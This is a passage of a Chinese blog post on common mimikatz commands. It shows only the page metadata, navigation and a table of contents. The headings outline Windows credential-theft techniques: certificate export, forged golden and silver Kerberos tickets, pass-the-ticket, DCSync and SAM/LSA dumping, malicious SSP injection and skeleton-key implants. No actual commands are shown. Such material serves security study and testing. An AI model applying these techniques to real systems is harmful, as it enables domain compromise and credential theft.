<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="mimikatz的一些常用模块测试环境：Windows 2012 R2 子域DC1.CRYPTO模块crypto模块提供与Windows加密功能(CryptoAPI)接合的功能，主要用来导出那些没有被标记为“可导出”的证书 crypto::capi 给CryptoAPI打补丁，方便导出证书 crypto::certificates 列出&#x2F;导出证书通常需要先执行privilege::debug提升权">
<meta property="og:type" content="article">
<meta property="og:title" content="mimikatz常用命令">
<meta property="og:url" content="http://yoursite.com/2017/07/30/mimikatz-usage/index.html">
<meta property="og:site_name" content="Code Life">
<meta property="og:description" content="mimikatz的一些常用模块测试环境：Windows 2012 R2 子域DC1.CRYPTO模块crypto模块提供与Windows加密功能(CryptoAPI)接合的功能，主要用来导出那些没有被标记为“可导出”的证书 crypto::capi 给CryptoAPI打补丁，方便导出证书 crypto::certificates 列出&#x2F;导出证书通常需要先执行privilege::debug提升权">
<meta property="og:locale">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/crypto.capi.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/crypto.cer.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/crypto.hash.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/crypto.keys.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/crypto.providers.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/event.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/kerberos.ask.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/kerberos.godlen.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/silver.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/trust1.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/trust2.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/kekeo1.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/kekeo3.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/kekeo2.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/kerberos.list.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/kerberos.ptt.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/kerberos.tgt.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/lsadump.backupkeys.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/lsadump.cache.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/lsadump.dcsync.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/lsadump.lsa1.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/lsadump.lsa2.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/lsadump.sam1.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/lsadump.secrets.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/misc.detours.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/misc.memssp.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/misc.skeleton.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/net.user.jpg">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/sekurlsa.backupkeys.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/sekurlsa.credman.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/sekurlsa.dpapi.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/sekurlsa.dpapisystem.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/sekurlsa.ekeys.png">
<meta property="og:image" content="http://yoursite.com/2017/07/30/img/sekurlsa.kerberos.png">
<meta property="article:published_time" content="2017-07-30T11:45:41.000Z">
<meta property="article:modified_time" content="2020-08-13T15:17:54.900Z">
<meta property="article:author" content="lex">
<meta property="article:tag" content="mimikatz, adsec">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2017/07/30/img/crypto.capi.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>mimikatz常用命令</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.0.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2017/08/26/Deffie-Hellman/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/07/30/mimikatz-usage/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2017/07/30/mimikatz-usage/&text=mimikatz常用命令"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/07/30/mimikatz-usage/&is_video=false&description=mimikatz常用命令"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=mimikatz常用命令&body=Check out this article: http://yoursite.com/2017/07/30/mimikatz-usage/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/07/30/mimikatz-usage/&name=mimikatz常用命令&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2017/07/30/mimikatz-usage/&t=mimikatz常用命令"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.</span> <span class="toc-text">mimikatz的一些常用模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%9AWindows-2012-R2-%E5%AD%90%E5%9F%9FDC"><span class="toc-number">2.</span> <span class="toc-text">测试环境：Windows 2012 R2 子域DC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-CRYPTO%E6%A8%A1%E5%9D%97"><span class="toc-number">3.</span> <span class="toc-text">1.CRYPTO模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-capi-%E7%BB%99CryptoAPI%E6%89%93%E8%A1%A5%E4%B8%81%EF%BC%8C%E6%96%B9%E4%BE%BF%E5%AF%BC%E5%87%BA%E8%AF%81%E4%B9%A6"><span class="toc-number">3.0.1.</span> <span class="toc-text">crypto::capi 给CryptoAPI打补丁，方便导出证书</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-certificates-%E5%88%97%E5%87%BA-%E5%AF%BC%E5%87%BA%E8%AF%81%E4%B9%A6"><span class="toc-number">3.0.2.</span> <span class="toc-text">crypto::certificates 列出&#x2F;导出证书</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-cng-%E7%BB%99CNG%E6%9C%8D%E5%8A%A1%E6%89%93%E8%A1%A5%E4%B8%81%EF%BC%8C%E6%96%B9%E4%BE%BF%E5%AF%BC%E5%87%BA%E8%AF%81%E4%B9%A6%EF%BC%88%E8%A1%A5%E4%B8%81Keylso%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="toc-number">3.0.3.</span> <span class="toc-text">crypto::cng    给CNG服务打补丁，方便导出证书（补丁Keylso服务）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-hash-%E5%AF%B9%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8CHASH%E6%93%8D%E4%BD%9C"><span class="toc-number">3.0.4.</span> <span class="toc-text">crypto::hash    对密码进行HASH操作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-keys-%E5%88%97%E5%87%BA-%E5%AF%BC%E5%87%BA%E5%AF%86%E9%92%A5%E7%9A%84%E5%AE%B9%E5%99%A8"><span class="toc-number">3.0.5.</span> <span class="toc-text">crypto::keys    列出&#x2F;导出密钥的容器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-providers-%E5%88%97%E5%87%BA%E5%8A%A0%E5%AF%86%E6%8F%90%E4%BE%9B%E5%95%86"><span class="toc-number">3.0.6.</span> <span class="toc-text">crypto::providers    列出加密提供商</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-stores-%E5%88%97%E5%87%BA%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.0.7.</span> <span class="toc-text">crypto::stores        列出加密存储类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-system-%E6%8F%90%E4%BE%9B%E7%B3%BB%E7%BB%9F%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84%E6%88%96%E8%80%85%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">3.0.8.</span> <span class="toc-text">crypto:system     提供系统证书文件的路径或者注册表配置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DPAPI%E6%A8%A1%E5%9D%97"><span class="toc-number">4.</span> <span class="toc-text">2.DPAPI模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-EVENT%E6%A8%A1%E5%9D%97"><span class="toc-number">5.</span> <span class="toc-text">3.EVENT模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-KERBEROS%E6%A8%A1%E5%9D%97"><span class="toc-number">6.</span> <span class="toc-text">4.KERBEROS模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-ASK-%E8%AF%B7%E6%B1%82TGS%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.1.</span> <span class="toc-text">KERBEROS::ASK    请求TGS票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-CLIST-%E5%88%97%E5%87%BA%E5%9C%A8MIT-HEIMDALL%E7%BC%93%E5%AD%98%E4%B8%AD%E7%9A%84%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.2.</span> <span class="toc-text">KERBEROS::CLIST    列出在MIT&#x2F;HEIMDALL缓存中的票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-GOLDEN-%E5%88%9B%E5%BB%BA%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.3.</span> <span class="toc-text">KERBEROS::GOLDEN    创建黄金票据&#x2F;白银票据&#x2F;信任票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.4.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.5.</span> <span class="toc-text">白银票据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.</span> <span class="toc-text">信任票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E4%B8%80%E4%B8%AA%E5%86%85%E9%83%A8AD%E6%9E%97%E7%9A%84%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.1.</span> <span class="toc-text">伪造一个内部AD林的信任票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-Hash-%E6%8A%8A%E5%AF%86%E7%A0%81hash%E6%88%90%E5%AF%86%E9%92%A5"><span class="toc-number">6.1.2.</span> <span class="toc-text">KERBEROS::Hash    -    把密码hash成密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-List-%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E4%BF%9D%E5%AD%98%E5%9C%A8%E7%94%A8%E6%88%B7%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E7%9A%84%E7%A5%A8%E6%8D%AE%EF%BC%88TGT-TGS%EF%BC%89%EF%BC%8C%E4%B8%8D%E9%9C%80%E8%A6%81%E7%89%B9%E6%AE%8A%E7%9A%84%E6%9D%83%E9%99%90%E5%9B%A0%E4%B8%BA%E5%8F%AA%E5%88%97%E5%87%BA%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%9A%84%E7%A5%A8%E6%8D%AE%EF%BC%8C%E5%B0%B1%E5%83%8F%E5%91%BD%E4%BB%A4klist"><span class="toc-number">6.1.3.</span> <span class="toc-text">KERBEROS::List    -    列出所有保存在用户内存中的用户的票据（TGT&#x2F;TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-PTC-%E4%BC%A0%E9%80%92%E7%BC%93%E5%AD%98%EF%BC%88NT6%EF%BC%89"><span class="toc-number">6.1.4.</span> <span class="toc-text">KERBEROS::PTC        -    传递缓存（NT6）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-PTT-%E4%BC%A0%E9%80%92%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.5.</span> <span class="toc-text">KERBEROS::PTT        -    传递票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-PURGE-%E6%B8%85%E9%99%A4%E5%BD%93%E5%89%8D%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89kerberos%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.6.</span> <span class="toc-text">KERBEROS::PURGE    清除当前会话中的所有kerberos票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-TGT-%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%9A%84TGT"><span class="toc-number">6.1.7.</span> <span class="toc-text">KERBEROS::TGT        获得当前用户的TGT</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LSADUMP"><span class="toc-number">7.</span> <span class="toc-text">5.LSADUMP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-BACKUPKEYS"><span class="toc-number">7.0.1.</span> <span class="toc-text">LSADUMP::BACKUPKEYS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-CACHE-%E8%8E%B7%E5%8F%96Syskey%E7%94%A8%E6%9D%A5%E8%A7%A3%E5%AF%86NL-KM-AND-MSCACHE-V2-%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%88%96%E8%80%85hives%E6%96%87%E4%BB%B6%E4%B8%AD%E8%8E%B7%E5%8F%96"><span class="toc-number">7.0.2.</span> <span class="toc-text">LSADUMP::CACHE    -    获取Syskey用来解密NL$KM AND MSCACHE(V2)(从注册表或者hives文件中获取)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-DCSYNC-%E5%90%91DC%E5%8F%91%E8%B5%B7%E4%B8%80%E4%B8%AA%E5%90%8C%E6%AD%A5%E5%AF%B9%E8%B1%A1%E8%AF%B7%E6%B1%82-%E8%8E%B7%E5%8F%96%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE"><span class="toc-number">7.0.3.</span> <span class="toc-text">LSADUMP::DCSYNC    -    向DC发起一个同步对象请求(获取账户密码数据)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#DCSync%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84"><span class="toc-number">7.0.3.1.</span> <span class="toc-text">DCSync是如何工作的</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-LSA-%E4%BB%8ELSA%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%AF%BC%E5%87%BA%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%AF%BC%E5%87%BA%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">7.0.4.</span> <span class="toc-text">LSADUMP::LSA    -    从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-NETSYNC"><span class="toc-number">7.0.5.</span> <span class="toc-text">LSADUMP::NETSYNC</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-RPDATA"><span class="toc-number">7.0.6.</span> <span class="toc-text">LSADUMP::RPDATA</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-SAM-%E8%8E%B7%E5%8F%96sysken%E6%9D%A5%E8%A7%A3%E5%AF%86SAM%EF%BC%88%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%88%96%E8%80%85hive%E6%96%87%E4%BB%B6%E4%B8%AD%E8%8E%B7%E5%8F%96%EF%BC%89%E3%80%82SAM%E4%BC%9A%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88SAM%EF%BC%89%E5%B9%B6%E4%B8%94%E8%BD%AC%E5%AD%98%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E7%9A%84%E5%87%AD%E8%AF%81%E3%80%82"><span class="toc-number">7.0.7.</span> <span class="toc-text">LSADUMP::SAM - 获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-SECRETS-%E8%8E%B7%E5%8F%96syskey%E6%9D%A5%E8%A7%A3%E5%AF%86SECRETS%E6%9D%A1%E7%9B%AE"><span class="toc-number">7.0.8.</span> <span class="toc-text">LSADUMP::SECRETS    -    获取syskey来解密SECRETS条目</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-TRUST-%E8%AF%B7%E6%B1%82LSA-server%E6%A3%80%E7%B4%A2%E4%BF%A1%E4%BB%BB%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%BF%A1%E6%81%AF"><span class="toc-number">7.0.9.</span> <span class="toc-text">LSADUMP::TRUST    -    请求LSA server检索信任身份验证信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-MISC"><span class="toc-number">8.</span> <span class="toc-text">6.MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-ADDSID-%EF%BC%88%E6%96%B0%E7%89%88%E6%9C%AC%E8%AF%A5%E5%8A%9F%E8%83%BD%E5%9C%A8sid%E6%A8%A1%E5%9D%97%E4%B8%8Bsid-add%EF%BC%89"><span class="toc-number">8.0.1.</span> <span class="toc-text">MISC::ADDSID -（新版本该功能在sid模块下sid::add）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-CMD-%E8%BF%90%E8%A1%8CCMD"><span class="toc-number">8.0.2.</span> <span class="toc-text">MISC::CMD    - 运行CMD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-compressme-%E5%8E%8B%E7%BC%A9%E6%89%93%E5%8C%85%E8%87%AA%E8%BA%AB"><span class="toc-number">8.0.3.</span> <span class="toc-text">MISC::compressme - 压缩打包自身</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-DETOURS-%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8Detours-like-hooks%E5%88%97%E4%B8%BE%E6%89%80%E6%9C%89%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-number">8.0.4.</span> <span class="toc-text">MISC::DETOURS - 尝试使用Detours-like hooks列举所有的模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-MemSSP-%E9%80%9A%E8%BF%87%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84SSP%E7%BB%99%E5%86%85%E5%AD%98%E9%87%8C%E7%9A%84LSASS%E8%BF%9B%E7%A8%8B%E6%89%93%E8%A1%A5%E4%B8%81%EF%BC%8C%E6%B3%A8%E5%85%A5%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84SSP%E6%9D%A5%E8%AE%B0%E5%BD%95%E6%9C%AC%E5%9C%B0%E7%99%BB%E5%BD%95%E6%8E%88%E6%9D%83%E7%9A%84%E5%87%AD%E8%AF%81%EF%BC%8C%E8%AF%A5%E6%93%8D%E4%BD%9C%E4%B8%8D%E9%9C%80%E8%A6%81%E9%87%8D%E5%90%AF%EF%BC%8C%E9%87%8D%E5%90%AF%E5%90%8E%E4%BC%9A%E6%B8%85%E9%99%A4mimikatz%E6%B3%A8%E5%85%A5%E7%9A%84memssp%E3%80%82"><span class="toc-number">8.0.5.</span> <span class="toc-text">MISC::MemSSP - 通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-ncroutemon-juiper%E7%AE%A1%E7%90%86%E5%99%A8%EF%BC%88%E6%B2%A1%E6%9C%89DisableTaskMgr%EF%BC%89"><span class="toc-number">8.0.6.</span> <span class="toc-text">MISC::ncroutemon - juiper管理器（没有DisableTaskMgr）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-regedit-%E6%89%93%E5%BC%80%E6%B3%A8%E5%86%8C%E8%A1%A8%EF%BC%88%E6%B2%A1%E6%9C%89DisableRegistryTools%EF%BC%89"><span class="toc-number">8.0.7.</span> <span class="toc-text">MISC::regedit - 打开注册表（没有DisableRegistryTools）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-Skeleton-%E5%9C%A8%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E4%B8%8A%E6%B3%A8%E5%85%A5%E4%B8%80%E4%B8%AASekeleton-key%E5%88%B0LSASS%E8%BF%9B%E7%A8%8B"><span class="toc-number">8.0.8.</span> <span class="toc-text">MISC::Skeleton - 在域控制器上注入一个Sekeleton key到LSASS进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-TASKMGR-%E6%89%93%E5%BC%80%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">8.0.9.</span> <span class="toc-text">MISC::TASKMGR - 打开任务管理器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-MINESWEEPER"><span class="toc-number">9.</span> <span class="toc-text">7.MINESWEEPER</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MINESWEEPER-INFOS-%E6%8F%90%E4%BE%9Bminesweeper%E7%9A%84mine%E4%BF%A1%E6%81%AF"><span class="toc-number">9.0.1.</span> <span class="toc-text">MINESWEEPER::INFOS - 提供minesweeper的mine信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-NET"><span class="toc-number">10.</span> <span class="toc-text">8.NET</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NET-user-%E5%88%97%E5%87%BA%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E6%89%80%E5%B1%9E%E7%BB%84"><span class="toc-number">10.0.1.</span> <span class="toc-text">NET::user - 列出用户名及所属组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NET-GROUP"><span class="toc-number">10.0.2.</span> <span class="toc-text">NET::GROUP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NET-LOCALGROUP"><span class="toc-number">10.0.3.</span> <span class="toc-text">NET::LOCALGROUP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-PEIVILEGE"><span class="toc-number">11.</span> <span class="toc-text">9.PEIVILEGE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-DEBUG-%E8%8E%B7%E5%BE%97debug%E6%9D%83%E9%99%90"><span class="toc-number">11.0.1.</span> <span class="toc-text">PRIVILEGE::DEBUG - 获得debug权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-BACKUP-%E5%A4%87%E4%BB%BD%E4%B8%80%E4%B8%AA%E6%9D%83%E9%99%90"><span class="toc-number">11.0.2.</span> <span class="toc-text">PRIVILEGE::BACKUP - 备份一个权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-DRIVER-%E8%8E%B7%E5%BE%97%E9%A9%B1%E5%8A%A8%E6%9D%83%E9%99%90"><span class="toc-number">11.0.3.</span> <span class="toc-text">PRIVILEGE::DRIVER - 获得驱动权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-ID-%E8%8E%B7%E5%BE%97ID%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">11.0.4.</span> <span class="toc-text">PRIVILEGE::ID - 获得ID所对应的权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-NAME-%E8%8E%B7%E5%BE%97NAME%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">11.0.5.</span> <span class="toc-text">PRIVILEGE::NAME - 获得NAME所对应的权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-RESTORE-%E8%8E%B7%E5%BE%97restore%E6%9D%83%E9%99%90"><span class="toc-number">11.0.6.</span> <span class="toc-text">PRIVILEGE::RESTORE - 